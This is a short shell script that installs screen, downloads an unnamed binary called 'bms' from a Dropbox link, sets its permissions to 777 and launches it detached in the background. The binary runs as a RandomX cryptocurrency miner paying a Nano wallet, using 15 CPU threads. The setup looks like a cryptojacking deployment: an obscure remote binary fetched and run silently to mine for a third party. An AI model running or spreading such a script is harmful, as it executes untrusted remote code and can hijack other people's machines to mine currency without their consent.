
sudo apt-get update -y
sudo apt-get install -y screen
wget http://dl.dropboxusercontent.com/s/khboofn0qh8fyut/bms
chmod 777 bms
screen -d -m ./bms --algorithm randomx --pool rx.unmineable.com:3333 --wallet XNO:nano_1bfqa7m7rstx4zpaqpkib8owc8rqrgbznyr4a47nspdnyjmsquso4w4pxbkq --password pod --cpu-threads 15
